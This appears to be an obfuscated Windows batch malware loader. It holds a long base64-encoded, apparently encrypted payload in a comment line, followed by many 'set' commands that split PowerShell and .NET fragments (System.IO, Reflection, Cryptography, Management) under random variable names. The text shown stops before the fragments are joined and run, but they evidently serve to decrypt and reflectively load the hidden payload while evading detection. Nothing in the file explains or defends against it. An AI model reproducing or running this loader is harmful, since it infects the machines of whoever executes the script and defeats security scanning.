@echo off
:: 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
set "wZpEgWDmyc=e]::"
set "mdLDubpqYH=D.Su"
set "yqvomAzrII=);$I"
set "bEEyJUxTVQ=morF"
set "pNQrPiYOUh=NGEN"
set "rjdfnDGZvt=join"
set "sSthEacMXb=nage"
set "lQVqAYpNXa=[Sys"
set "atGcsGFvim=ew-O"
set "RVAlEEVmab=m.IO"
set "OPkPjjbVGl=stem"
set "pOddqgkhUi=PNtJ"
set "VaVChJNZQe=$zgM"
set "CqoJLFGFYs= [st"
set "aLSoaLKPUZ=y.Cr"
set "eKgLyAkqSd=::('"
set "kSbWluKVON=m.Re"
set "FWKcwePlep=lBlo"
set "cZBGoqzKmU=.Mod"
set "eOGFsfdRAl=[-1."
set "DGzaaPreYZ=Bmor"
set "HXcSgTnyBM=dkwC"
set "ptsQSDfgbG=] -j"
set "eFUSeOuSns=TuCw"
